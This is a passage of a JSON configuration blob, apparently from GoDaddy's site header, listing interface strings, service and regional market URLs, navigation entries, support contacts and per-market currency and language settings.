interactive services such as chat support and customer feedback tools.","Shared:Common:OK":"OK","Shared:Help:HeaderLink":"Help","Shared:UtilityBar:AccountTray:CreateAccount":"Create My Account","Shared:UtilityBar:AccountTray:RegisteredUser":"Registered Users","Shared:UtilityBar:AccountTray:SignIn":"Sign In","Shared:UtilityBar:AccountTray:LogOut":"Log Out","Shared:UtilityBar:AccountTray:CustomerNumberLabel":"Customer #:","Shared:UtilityBar:AccountTray:NewCustomerHeading":"New Customer","Shared:UtilityBar:AccountTray:NewCustomerMessage":"New to {privateLabelName}?","Shared:UtilityBar:AccountTray:CreateAccountMessage":"Create an account to get started today.","Shared:UtilityBar:AccountTray:SignInAccountMessage":"Have an account? Sign in now.","Shared:UtilityBar:QuickLinks:Heading":"Quick Links","Shared:UtilityBar:QuickLinks:ControlPanelLinks:ManageDomains":"Manage Domains","Shared:UtilityBar:QuickLinks:ControlPanelLinks:ManageWebsiteBuilder":"Manage Website Builder","Shared:UtilityBar:QuickLinks:ControlPanelLinks:ManageHosting":"Manage Hosting","Shared:UtilityBar:QuickLinks:ControlPanelLinks:Heading":"Control Panel Links:","Shared:UtilityBar:QuickLinks:ControlPanelLinks:ManageSslCertificates":"Manage SSL Certificates","Shared:UtilityBar:QuickLinks:InboxLinks:Heading":"Inbox Links:","Shared:UtilityBar:QuickLinks:InboxLinks:WebmailLogin":"GoDaddy Webmail Login","Shared:UtilityBar:QuickLinks:InboxLinks:O365Login":"Office 365 Email Login","Shared:UtilityBar:Cart:ItemsInCartMessage":"Checkout Now","Shared:UtilityBar:AccountTray:VisitMyAccount":"Visit My Account","Shared:UtilityBar:AccountTray:Renewals":"My Renewals","Shared:UtilityBar:AccountTray:MyProducts":"My Products","Shared:UtilityBar:AccountTray:AccountSettings":"Account Settings","Shared:UtilityBar:AccountTray:ProDashboard":"Pro Dashboard","Shared:AccountTray:CustomerPinLabel":"PIN:","Shared:UtilityBar:BackToLogin":"Back to login","Shared:UtilityBar:Notifications:NoNotificationsTitle":"You have no notifications.","Shared:UtilityBar:Notifications:NoNotificationsText":"They'll be here when you get 'em.","Shared:UtilityBar:Notifications:FailedNotificationsTitle":"Your session has expired.","Shared:UtilityBar:Notifications:FailedNotificationsText":"Please sign in again to receive notifications.","Shared:UtilityBar:Notifications:FailedNotificationsLink":"Sign In","Shared:UtilityBar:Vip:VipRepName":"VIP Account Exec","Shared:UtilityBar:Vip:VipExecPhone":"Call","Shared:UtilityBar:Vip:VipExecEmail":"Email","Shared:UtilityBar:SupportPhone:Alternate:Numbers":"Alternate numbers","Shared:UtilityBar:SupportPhone:CallUs":"Call us","Shared:UtilityBar:SupportPhone:Chat":"Chat with our sales & support team for quick answers on product features, pricing and more.","Shared:UtilityBar:SupportPhone:ChatNow":"Chat Now","Shared:UtilityBar:SupportPhone:ChatOffline":"Chat Offline","Shared:UtilityBar:SupportPhone:ContactUs":"Contact Us","Shared:UtilityBar:SupportPhone:ContactUs247":"Contact Us 24/7","Shared:UtilityBar:SupportPhone:GlobalDirectory":"Phone numbers and hours","Shared:UtilityBar:SupportPhone:GlobalDirectory:GlobalDirectory":"Global Directory","Shared:UtilityBar:SupportPhone:GlobalDirectory:GlobalDirectoryList":"List of global phone numbers.","Shared:UtilityBar:SupportPhone:HelpCenter":"Help Center","Shared:UtilityBar:SupportPhone:HelpCenter:Explore":"Explore our online help resources","Shared:UtilityBar:SupportPhone:HelpCenter:HelpCenterLink":"Get Help","Shared:UtilityBar:MarketSelectorTray:Title":"Choose your Country/Region","Shared:UtilityBar:MarketSelectorTray:AriaLabel":"Content Language Selector. Currently set to {selection}.","Shared:AccountDelegation:validateAuthTitle":"Session Expired","Shared:AccountDelegation:validateAuthShopper":"You aren't logged in as shopper {displayName}/{shopperId} anymore.","Shared:AccountDelegation:validateAuthMessage":"You can close this tab or log in again as this shopper.","Shared:AccountDelegation:pageAuthRefreshMessage":"There seems to be a discrepency with your authentication, please click the button below to attempt to repair it.","Shared:AccountDelegation:deny-all-title":"Access Restricted","Shared:AccountDelegation:deny-all-msg":"You can't access this area. Only the account holder can access this area.","Shared:BrowserDeprecationBanner:HoldingUsBack":"We're not ageist, but your old browser is holding us back.","Shared:BrowserDeprecationBanner:LatestVersion":"Update to the latest version to see this site in all its glory.","Shared:BrowserDeprecationBanner:UpdateBrowser":"Update {browser}","Shared:BrowserDeprecationBanner:GetBrowser":"Get {browser}","Shared:BrowserDeprecationBanner:DownloadChrome":"https://www.google.com/chrome/","Shared:BrowserDeprecationBanner:DownloadFirefox":"https://www.mozilla.org/firefox/new/","Shared:BrowserDeprecationBanner:DownloadSafari":"https://www.apple.com/safari/","Shared:BrowserDeprecationBanner:DownloadEdge":"https://www.microsoft.com/windows/microsoft-edge"},"privateLabelId":1,"privateLabelName":"GoDaddy","privateLabelType":1,"progId":"GoDaddy","split":"","traffic":"inline","urls":{"bigthree":{"domains":{"href":"https://dcc.godaddy.com","rel":"nofollow"},"hosting":{"href":"https://myh.godaddy.com"},"email":{"href":"https://productivity.godaddy.com/emailchooser"},"ssl":{"href":"https://certs.godaddy.com"}},"account":{"href":"https://account.godaddy.com"},"renewals":{"href":"https://account.godaddy.com/billing?filter=expires&subFilter=90"},"products":{"href":"https://account.godaddy.com/products?go_redirect=disabled"},"accountHome":{"href":"https://account.godaddy.com/overview"},"checkout":{"href":"https://cart.godaddy.com"},"privacy":{"href":"https://www.godaddy.com/agreements/showdoc.aspx?pageid=PRIVACY","target":"_blank"},"cookies":{"href":"https://www.godaddy.com/agreements/showdoc.aspx?pageid=24668","target":"_blank"},"utos":{"href":"https://www.godaddy.com/agreements/showdoc.aspx?pageid=UTOS&app_hdr=0"},"help":{"href":"https://www.godaddy.com/help"},"blog":{"href":"https://www.godaddy.com/blog"},"manageDomains":{"href":"https://dcc.godaddy.com","rel":"nofollow"},"manageHosting":{"href":"https://myh.godaddy.com"},"webmailLogin":{"href":"https://email.godaddy.com?target=_blank","target":"_blank"},"home":{"href":"https://www.godaddy.com"},"resetPin":{"href":"https://account.godaddy.com/security/login-info/edit"},"viewPin":{"href":"https://account.godaddy.com/security/login-info/edit"},"pin":{"href":"https://mya.godaddy.com/pin"},"gui":{"href":"https://gui.godaddy.com/pcjson/salesheader"},"pro":{"href":"https://pro.godaddy.com"},"proHome":{"href":"https://www.godaddy.com/pro"},"proHomeApp":{"href":"https://pro.godaddy.com/launch/managewp?landingScreen=pro-home"},"notifications":{"api":{"href":"https://mya.godaddy.com/webapi/notifications"},"cache":{"href":"//img1.wsimg.com/mya/notifications/cache.html"},"endpoint":{"href":"https://notifications.api.cloud.godaddy.com/v1/notifications"}},"sso":{"exitDelegation":{"href":"https://sso.godaddy.com/cookie/switchback"},"restoreCookie":{"href":"https://sso.godaddy.com/cookie/restore"},"createAccount":{"href":"https://sso.godaddy.com/account/create?realm=idp&path=%2F&app=sso"},"o365Login":{"href":"https://sso.godaddy.com?app=o365&realm=pass","target":"_blank"},"login":{"href":"https://sso.godaddy.com?realm=idp&path=%2F&app=sso"},"logout":{"href":"https://sso.godaddy.com/logout?realm=idp"}},"markets":{"da-DK":{"href":"https://dk.godaddy.com"},"de-AT":{"href":"https://at.godaddy.com"},"de-CH":{"href":"https://ch.godaddy.com"},"de-DE":{"href":"https://de.godaddy.com"},"el-GR":{"href":"https://gr.godaddy.com"},"en-AE":{"href":"https://ae.godaddy.com"},"en-AU":{"href":"https://au.godaddy.com"},"en-CA":{"href":"https://ca.godaddy.com"},"en-GB":{"href":"https://uk.godaddy.com"},"en-HK":{"href":"https://hk.godaddy.com/en"},"en-IE":{"href":"https://ie.godaddy.com"},"en-IL":{"href":"https://il.godaddy.com/en"},"en-IN":{"href":"https://in.godaddy.com"},"en-MY":{"href":"https://my.godaddy.com"},"en-NZ":{"href":"https://nz.godaddy.com"},"en-PH":{"href":"https://ph.godaddy.com"},"en-PK":{"href":"https://pk.godaddy.com"},"en-SG":{"href":"https://sg.godaddy.com"},"en-US":{"href":"https://www.godaddy.com"},"en-ZA":{"href":"https://za.godaddy.com"},"es-AR":{"href":"https://ar.godaddy.com"},"es-CL":{"href":"https://cl.godaddy.com"},"es-CO":{"href":"https://co.godaddy.com"},"es-ES":{"href":"https://es.godaddy.com"},"es-MX":{"href":"https://mx.godaddy.com"},"es-PE":{"href":"https://pe.godaddy.com"},"es-US":{"href":"https://www.godaddy.com/es"},"es-VE":{"href":"https://ve.godaddy.com"},"fi-FI":{"href":"https://fi.godaddy.com"},"fr-BE":{"href":"https://be.godaddy.com/fr"},"fr-CA":{"href":"https://ca.godaddy.com/fr"},"fr-CH":{"href":"https://ch.godaddy.com/fr"},"fr-FR":{"href":"https://fr.godaddy.com"},"hi-IN":{"href":"https://in.godaddy.com/hi"},"id-ID":{"href":"https://id.godaddy.com"},"it-CH":{"href":"https://ch.godaddy.com/it"},"it-IT":{"href":"https://it.godaddy.com"},"ja-JP":{"href":"https://jp.godaddy.com"},"ko-KR":{"href":"https://kr.godaddy.com"},"mr-IN":{"href":"https://in.godaddy.com/mr"},"nb-NO":{"href":"https://no.godaddy.com"},"nl-BE":{"href":"https://be.godaddy.com"},"nl-NL":{"href":"https://nl.godaddy.com"},"pl-PL":{"href":"https://pl.godaddy.com"},"pt-BR":{"href":"https://br.godaddy.com"},"pt-PT":{"href":"https://pt.godaddy.com"},"qa-PS":{"href":"https://www.godaddy.com"},"qa-PZ":{"href":"https://www.godaddy.com"},"qa-QA":{"href":"https://www.godaddy.com"},"ru-RU":{"href":"https://ru.godaddy.com"},"sv-SE":{"href":"https://se.godaddy.com"},"ta-IN":{"href":"https://in.godaddy.com/ta"},"th-TH":{"href":"https://th.godaddy.com"},"tr-TR":{"href":"https://tr.godaddy.com"},"uk-UA":{"href":"https://ua.godaddy.com"},"vi-VN":{"href":"https://vn.godaddy.com"},"zh-HK":{"href":"https://hk.godaddy.com"},"zh-SG":{"href":"https://sg.godaddy.com/zh"},"zh-TW":{"href":"https://tw.godaddy.com"}},"currencyList":{"href":"https://gui.godaddy.com/preference/currency/set"},"pcgo":{"href":"https://gui.godaddy.com/pcgo/sso"},"contactUs":{"href":"https://www.godaddy.com/contact-us"},"store":{"href":"https://companystore.godaddy.net"},"gdAssets":{"href":"https://www.godaddy.com/assets"},"cdn":{"href":"//img1.wsimg.com/"}},"marketSelector":{"markets":["es-AR","en-AU","nl-BE","fr-BE","pt-BR","en-CA","fr-CA","es-CL","es-CO","da-DK","de-DE","es-ES","es-US","fr-FR","en-HK","en-IN","mr-IN","hi-IN","ta-IN","id-ID","en-IE","en-IL","it-IT","en-MY","es-MX","nl-NL","en-NZ","nb-NO","de-AT","en-PK","es-PE","en-PH","pl-PL","pt-PT","de-CH","en-SG","en-ZA","fr-CH","fi-FI","sv-SE","it-CH","tr-TR","en-AE","en-GB","en-US","es-VE","vi-VN","el-GR","ru-RU","uk-UA","th-TH","ko-KR","zh-TW","zh-SG","ja-JP","zh-HK"]},"preset":"language-header","supportContacts":{"technicalSupportLabel":"Contact Us 24/7","technicalSupportPhone":"480-505-8877","technicalSupportHours":"24/7 Support","technicalSupportDescription":"Call our award-winning sales & support team 24/7","liveChatHours":"Hours: All Day Mon – Fri","cityContacts":{"Primary":{"liveChatHours":"Call our award-winning sales & support team 24/7","technicalSupportDescription":"Call our award-winning sales & support team 24/7","technicalSupportHours":"Call our award-winning sales & support team 24/7","technicalSupportLabel":"Contact Us 24/7","technicalSupportPhone":"480-505-8877"}}},"utilityBarNav":[{"children":[{"children":[{"href":"https://dcc.godaddy.com","rel":"nofollow","caption":"Shared:UtilityBar:QuickLinks:ControlPanelLinks:ManageDomains"},{"href":"https://account.godaddy.com/products?go_redirect=disabled#Websites","caption":"Shared:UtilityBar:QuickLinks:ControlPanelLinks:ManageWebsiteBuilder"},{"href":"https://myh.godaddy.com","caption":"Shared:UtilityBar:QuickLinks:ControlPanelLinks:ManageHosting"},{"href":"https://certs.godaddy.com","caption":"Shared:UtilityBar:QuickLinks:ControlPanelLinks:ManageSslCertificates"}],"options":{"isNew":false,"isFree":false,"onSale":false,"isPro":false,"hideSecondaryNav":false},"caption":"Shared:UtilityBar:QuickLinks:ControlPanelLinks:Heading"},{"children":[{"href":"https://sso.godaddy.com?app=o365&realm=pass","target":"_blank","caption":"Shared:UtilityBar:QuickLinks:InboxLinks:O365Login"},{"href":"https://email.godaddy.com?target=_blank","target":"_blank","caption":"Shared:UtilityBar:QuickLinks:InboxLinks:WebmailLogin"}],"options":{"isNew":false,"isFree":false,"onSale":false,"isPro":false,"hideSecondaryNav":false},"caption":"Shared:UtilityBar:QuickLinks:InboxLinks:Heading"}],"options":{"isNew":false,"isFree":false,"onSale":false,"isPro":false,"hideSecondaryNav":false},"caption":"Shared:UtilityBar:QuickLinks:Heading"},{"children":[{"href":"https://pro.godaddy.com","caption":"Shared:UtilityBar:AccountTray:ProDashboard"},{"href":"https://account.godaddy.com/products?go_redirect=disabled","rel":"nofollow","caption":"Shared:UtilityBar:AccountTray:ManageYourAccount"},{"href":"https://account.godaddy.com/products?go_redirect=disabled","caption":"Shared:UtilityBar:AccountTray:MyProducts"},{"href":"https://account.godaddy.com","caption":"Shared:UtilityBar:AccountTray:AccountSettings"},{"href":"https://account.godaddy.com/billing?filter=expires&subFilter=90","options":{"isNew":false,"isFree":false,"onSale":false,"isPro":false,"hideSecondaryNav":false},"caption":"Shared:UtilityBar:AccountTray:Renewals"},{"href":"https://account.godaddy.com/products?go_redirect=disabled","rel":"nofollow","options":{"isNew":false,"isFree":false,"onSale":false,"isPro":false,"hideSecondaryNav":false},"caption":"Shared:UtilityBar:AccountTray:VisitMyAccount"},{"href":"https://sso.godaddy.com/account/create?realm=idp&path=%2F&app=sso","caption":"Shared:UtilityBar:AccountTray:CreateAccount"},{"href":"https://sso.godaddy.com?realm=idp&path=%2F&app=sso","caption":"Shared:UtilityBar:AccountTray:SignIn"},{"href":"https://sso.godaddy.com/logout?realm=idp","caption":"Shared:UtilityBar:AccountTray:LogOut"},{"href":"https://account.godaddy.com/security/login-info/edit","target":"_blank","caption":"Shared:UtilityBar:AccountTray:ViewPin"}],"options":{"isNew":false,"isFree":false,"onSale":false,"isPro":false,"hideSecondaryNav":false},"caption":null},{"children":[{"href":"https://cart.godaddy.com","caption":"Shared:UtilityBar:Cart:Cart"}],"options":{"isNew":false,"isFree":false,"onSale":false,"isPro":false,"hideSecondaryNav":false},"caption":null},{"children":[{"href":"https://www.godaddy.com/help","caption":"Shared:UtilityBar:Help:Help"}],"options":{"isNew":false,"isFree":false,"onSale":false,"isPro":false,"hideSecondaryNav":false},"caption":null},{"children":[{"href":"https://www.godaddy.com/contact-us?target=_blank","target":"_blank","caption":"Shared:UtilityBar:SupportPhone:GlobalDirectory"},{"href":"https://www.godaddy.com/contact-us","caption":"Shared:UtilityBar:SupportPhone:ContactUs"}],"options":{"isNew":false,"isFree":false,"onSale":false,"isPro":false,"hideSecondaryNav":false},"caption":null},{"children":[{"href":"https://www.godaddy.com/blog","caption":"Shared:UtilityBar:BlogLink"}],"options":{"isNew":false,"isFree":false,"onSale":false,"isPro":false,"hideSecondaryNav":false},"caption":"Shared:UtilityBar:BlogLink"}],"marketData":{"da-DK":{"market":"da-DK","internal":false,"countryCode":"dk","languageCode":"da","description":"Danmark - Dansk","countryName":"Danmark","languageName":"Dansk","currency":"DKK","countrySite":"dk","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true,"displayCode":"DK"},"de-AT":{"market":"de-AT","internal":false,"countryCode":"at","languageCode":"de","description":"Österreich - Deutsch","countryName":"Österreich","languageName":"Deutsch","currency":"EUR","countrySite":"at","primaryLanguageForCountry":true,"displayTaxesAndFees":"ALL","vatIncluded":true},"de-CH":{"market":"de-CH","internal":false,"countryCode":"ch","languageCode":"de","description":"Schweiz - Deutsch","countryName":"Schweiz","languageName":"Deutsch","currency":"CHF","countrySite":"ch","primaryLanguageForCountry":true,"displayTaxesAndFees":"ALL","vatIncluded":true},"de-DE":{"market":"de-DE","internal":false,"countryCode":"de","languageCode":"de","description":"Deutschland - Deutsch","countryName":"Deutschland","languageName":"Deutsch","currency":"EUR","countrySite":"de","primaryLanguageForCountry":true,"displayTaxesAndFees":"ALL","vatIncluded":true},"el-GR":{"market":"el-GR","internal":false,"countryCode":"gr","languageCode":"el","description":"Ελλάδα - Ελληνικά","countryName":"Ελλάδα","languageName":"Ελληνικά","currency":"EUR","countrySite":"gr","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true},"en-AE":{"market":"en-AE","internal":false,"countryCode":"ae","languageCode":"en","description":"United Arab Emirates - English","countryName":"United Arab Emirates","languageName":"English","currency":"AED","countrySite":"ae","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true},"en-AU":{"market":"en-AU","internal":false,"countryCode":"au","languageCode":"en","description":"Australia - English","countryName":"Australia","languageName":"English","currency":"AUD","countrySite":"au","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true},"en-CA":{"market":"en-CA","internal":false,"countryCode":"ca","languageCode":"en","description":"Canada - English","countryName":"Canada","languageName":"English","currency":"CAD","countrySite":"ca","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true},"en-GB":{"market":"en-GB","internal":false,"countryCode":"gb","languageCode":"en","description":"United Kingdom - English","countryName":"United Kingdom","languageName":"English","currency":"GBP","countrySite":"uk","primaryLanguageForCountry":true,"displayTaxesAndFees":"ICANN","vatIncluded":true},"en-HK":{"market":"en-HK","internal":false,"countryCode":"hk","languageCode":"en","description":"Hong Kong - English","countryName":"Hong Kong","languageName":"English","currency":"HKD","countrySite":"hk","primaryLanguageForCountry":false,"displayTaxesAndFees":"NONE","vatIncluded":true},"en-IE":{"market":"en-IE","internal":false,"countryCode":"ie","languageCode":"en","description":"Ireland - English","countryName":"Ireland","languageName":"English","currency":"EUR","countrySite":"ie","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true},"en-IL":{"market":"en-IL","internal":false,"countryCode":"il","languageCode":"en","description":"Israel - English","countryName":"Israel","languageName":"English","currency":"ILS","countrySite":"il","primaryLanguageForCountry":false,"displayTaxesAndFees":"NONE","vatIncluded":true},"en-IN":{"market":"en-IN","internal":false,"countryCode":"in","languageCode":"en","description":"India - English","countryName":"India","languageName":"English","currency":"INR","countrySite":"in","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true},"en-MY":{"market":"en-MY","internal":false,"countryCode":"my","languageCode":"en","description":"Malaysia - English","countryName":"Malaysia","languageName":"English","currency":"MYR","countrySite":"my","primaryLanguageForCountry":true,"displayTaxesAndFees":"ALL","vatIncluded":true},"en-NZ":{"market":"en-NZ","internal":false,"countryCode":"nz","languageCode":"en","description":"New Zealand - English","countryName":"New Zealand","languageName":"English","currency":"NZD","countrySite":"nz","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true},"en-PH":{"market":"en-PH","internal":false,"countryCode":"ph","languageCode":"en","description":"Philippines - English","countryName":"Philippines","languageName":"English","currency":"PHP","countrySite":"ph","primaryLanguageForCountry":true,"displayTaxesAndFees":"ALL","vatIncluded":true},"en-PK":{"market":"en-PK","internal":false,"countryCode":"pk","languageCode":"en","description":"Pakistan - English","countryName":"Pakistan","languageName":"English","currency":"PKR","countrySite":"pk","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true},"en-SG":{"market":"en-SG","internal":false,"countryCode":"sg","languageCode":"en","description":"Singapore - English","countryName":"Singapore","languageName":"English","currency":"SGD","countrySite":"sg","primaryLanguageForCountry":true,"displayTaxesAndFees":"ALL","vatIncluded":true},"en-US":{"market":"en-US","internal":false,"countryCode":"us","languageCode":"en","description":"United States - English","countryName":"United States","languageName":"English","currency":"USD","countrySite":"www","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true},"en-ZA":{"market":"en-ZA","internal":false,"countryCode":"za","languageCode":"en","description":"South Africa - English","countryName":"South Africa","languageName":"English","currency":"ZAR","countrySite":"za","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true},"es-AR":{"market":"es-AR","internal":false,"countryCode":"ar","languageCode":"es","description":"Argentina - Español","countryName":"Argentina","languageName":"Español","currency":"ARS","countrySite":"ar","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true},"es-CL":{"market":"es-CL","internal":false,"countryCode":"cl","languageCode":"es","description":"Chile - Español","countryName":"Chile","languageName":"Español","currency":"CLP","countrySite":"cl","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true},"es-CO":{"market":"es-CO","internal":false,"countryCode":"co","languageCode":"es","description":"Colombia - Español","countryName":"Colombia","languageName":"Español","currency":"COP","countrySite":"co","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true},"es-ES":{"market":"es-ES","internal":false,"countryCode":"es","languageCode":"es","description":"España - Español","countryName":"España","languageName":"Español","currency":"EUR","countrySite":"es","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true},"es-MX":{"market":"es-MX","internal":false,"countryCode":"mx","languageCode":"es","description":"México - Español","countryName":"México","languageName":"Español","currency":"MXN","countrySite":"mx","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true},"es-PE":{"market":"es-PE","internal":false,"countryCode":"pe","languageCode":"es","description":"Perú - Español","countryName":"Perú","languageName":"Español","currency":"PEN","countrySite":"pe","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true},"es-US":{"market":"es-US","internal":false,"countryCode":"us","languageCode":"es","description":"Estados Unidos - Español","countryName":"Estados Unidos","languageName":"Español","currency":"USD","countrySite":"www","primaryLanguageForCountry":false,"displayTaxesAndFees":"NONE","vatIncluded":true},"es-VE":{"market":"es-VE","internal":false,"countryCode":"ve","languageCode":"es","description":"Venezuela - Español","countryName":"Venezuela","languageName":"Español","currency":"USD","countrySite":"ve","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true},"fi-FI":{"market":"fi-FI","internal":false,"countryCode":"fi","languageCode":"fi","description":"Suomi - Suomi","countryName":"Suomi","languageName":"Suomi","currency":"EUR","countrySite":"fi","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true},"fr-BE":{"market":"fr-BE","internal":false,"countryCode":"be","languageCode":"fr","description":"Belgique - Français","countryName":"Belgique","languageName":"Français","currency":"EUR","countrySite":"be","primaryLanguageForCountry":false,"displayTaxesAndFees":"NONE","vatIncluded":true},"fr-CA":{"market":"fr-CA","internal":false,"countryCode":"ca","languageCode":"fr","description":"Canada - Français","countryName":"Canada","languageName":"Français","currency":"CAD","countrySite":"ca","primaryLanguageForCountry":false,"displayTaxesAndFees":"NONE","vatIncluded":true},"fr-CH":{"market":"fr-CH","internal":false,"countryCode":"ch","languageCode":"fr","description":"Suisse - Français","countryName":"Suisse","languageName":"Français","currency":"CHF","countrySite":"ch","primaryLanguageForCountry":false,"displayTaxesAndFees":"ALL","vatIncluded":true},"fr-FR":{"market":"fr-FR","internal":false,"countryCode":"fr","languageCode":"fr","description":"France - Français","countryName":"France","languageName":"Français","currency":"EUR","countrySite":"fr","primaryLanguageForCountry":true,"displayTaxesAndFees":"ALL","vatIncluded":true},"hi-IN":{"market":"hi-IN","internal":false,"countryCode":"in","languageCode":"hi","description":"India - हिंदी","countryName":"India","languageName":"हिंदी","currency":"INR","countrySite":"in","primaryLanguageForCountry":false,"displayTaxesAndFees":"NONE","vatIncluded":true,"displayCode":"हिंदी"},"id-ID":{"market":"id-ID","internal":false,"countryCode":"id","languageCode":"id","description":"Indonesia - Bahasa Indonesia","countryName":"Indonesia","languageName":"Bahasa Indonesia","currency":"IDR","countrySite":"id","primaryLanguageForCountry":true,"displayTaxesAndFees":"ALL","vatIncluded":true},"it-CH":{"market":"it-CH","internal":false,"countryCode":"ch","languageCode":"it","description":"Svizzera - Italiano","countryName":"Svizzera","languageName":"Italiano","currency":"CHF","countrySite":"ch","primaryLanguageForCountry":false,"displayTaxesAndFees":"ALL","vatIncluded":true},"it-IT":{"market":"it-IT","internal":false,"countryCode":"it","languageCode":"it","description":"Italia - Italiano","countryName":"Italia","languageName":"Italiano","currency":"EUR","countrySite":"it","primaryLanguageForCountry":true,"displayTaxesAndFees":"ALL","vatIncluded":true},"ja-JP":{"market":"ja-JP","internal":false,"countryCode":"jp","languageCode":"ja","description":"日本 - 日本語","countryName":"日本","languageName":"日本語","currency":"JPY","countrySite":"jp","primaryLanguageForCountry":true,"displayTaxesAndFees":"ALL","vatIncluded":true,"displayCode":"日本語"},"ko-KR":{"market":"ko-KR","internal":false,"countryCode":"kr","languageCode":"ko","description":"대한민국 - 한국어","countryName":"대한민국","languageName":"한국어","currency":"KRW","countrySite":"kr","primaryLanguageForCountry":true,"displayTaxesAndFees":"ALL","vatIncluded":true,"displayCode":"한국어"},"mr-IN":{"market":"mr-IN","internal":false,"countryCode":"in","languageCode":"mr","description":"India - मराठी","countryName":"India","languageName":"मराठी","currency":"INR","countrySite":"in","primaryLanguageForCountry":false,"displayTaxesAndFees":"NONE","vatIncluded":true,"displayCode":"मरा"},"nb-NO":{"market":"nb-NO","internal":false,"countryCode":"no","languageCode":"nb","description":"Norge - Bokmål","countryName":"Norge","languageName":"Bokmål","currency":"NOK","countrySite":"no","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true,"displayCode":"NO"},"nl-BE":{"market":"nl-BE","internal":false,"countryCode":"be","languageCode":"nl","description":"België - Nederlands","countryName":"België","languageName":"Nederlands","currency":"EUR","countrySite":"be","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true},"nl-NL":{"market":"nl-NL","internal":false,"countryCode":"nl","languageCode":"nl","description":"Nederland - Nederlands","countryName":"Nederland","languageName":"Nederlands","currency":"EUR","countrySite":"nl","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true},"pl-PL":{"market":"pl-PL","internal":false,"countryCode":"pl","languageCode":"pl","description":"Polska - Polski","countryName":"Polska","languageName":"Polski","currency":"PLN","countrySite":"pl","primaryLanguageForCountry":true,"displayTaxesAndFees":"ALL","vatIncluded":true},"pt-BR":{"market":"pt-BR","internal":false,"countryCode":"br","languageCode":"pt","description":"Brasil - Português","countryName":"Brasil","languageName":"Português","currency":"BRL","countrySite":"br","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true,"displayCode":"BR"},"pt-PT":{"market":"pt-PT","internal":false,"countryCode":"pt","languageCode":"pt","description":"Portugal - Português","countryName":"Portugal","languageName":"Português","currency":"EUR","countrySite":"pt","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true},"qa-PS":{"market":"qa-PS","internal":true,"countryCode":"ps","languageCode":"qa","description":"QA - Pseudo","countryName":"QA","languageName":"Pseudo","currency":"USD","countrySite":"www","primaryLanguageForCountry":false,"displayTaxesAndFees":"NONE","vatIncluded":true},"qa-PZ":{"market":"qa-PZ","internal":true,"countryCode":"pz","languageCode":"qa","description":"QA - Zs","countryName":"QA","languageName":"Zs","currency":"USD","countrySite":"www","primaryLanguageForCountry":false,"displayTaxesAndFees":"NONE","vatIncluded":true},"qa-QA":{"market":"qa-QA","internal":true,"countryCode":"qa","languageCode":"qa","description":"QA - Show Tags","countryName":"QA","languageName":"Show Tags","currency":"USD","countrySite":"www","primaryLanguageForCountry":false,"displayTaxesAndFees":"NONE","vatIncluded":true},"ru-RU":{"market":"ru-RU","internal":false,"countryCode":"ru","languageCode":"ru","description":"Россия - Русский","countryName":"Россия","languageName":"Русский","currency":"RUB","countrySite":"ru","primaryLanguageForCountry":true,"displayTaxesAndFees":"ICANN","vatIncluded":true,"displayCode":"РУ"},"sv-SE":{"market":"sv-SE","internal":false,"countryCode":"se","languageCode":"sv","description":"Sverige - Svenska","countryName":"Sverige","languageName":"Svenska","currency":"SEK","countrySite":"se","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true},"ta-IN":{"market":"ta-IN","internal":false,"countryCode":"in","languageCode":"ta","description":"India - தமிழ்","countryName":"India","languageName":"தமிழ்","currency":"INR","countrySite":"in","primaryLanguageForCountry":false,"displayTaxesAndFees":"NONE","vatIncluded":true,"displayCode":"தமி"},"th-TH":{"market":"th-TH","internal":false,"countryCode":"th","languageCode":"th","description":"ไทย - ไทย","countryName":"ไทย","languageName":"ไทย","currency":"THB","countrySite":"th","primaryLanguageForCountry":true,"displayTaxesAndFees":"ALL","vatIncluded":true,"displayCode":"ไทย"},"tr-TR":{"market":"tr-TR","internal":false,"countryCode":"tr","languageCode":"tr","description":"Türkiye - Türkçe","countryName":"Türkiye","languageName":"Türkçe","currency":"TRY","countrySite":"tr","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true},"uk-UA":{"market":"uk-UA","internal":false,"countryCode":"ua","languageCode":"uk","description":"Україна - Українська","countryName":"Україна","languageName":"Українська","currency":"UAH","countrySite":"ua","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true,"displayCode":"Укр."},"vi-VN":{"market":"vi-VN","internal":false,"countryCode":"vn","languageCode":"vi","description":"Việt Nam - Tiếng Việt","countryName":"Việt Nam","languageName":"Tiếng Việt","currency":"VND","countrySite":"vn","primaryLanguageForCountry":true,"displayTaxesAndFees":"ALL","vatIncluded":true},"zh-HK":{"market":"zh-HK","internal":false,"countryCode":"hk","languageCode":"zh","description":"香港 - 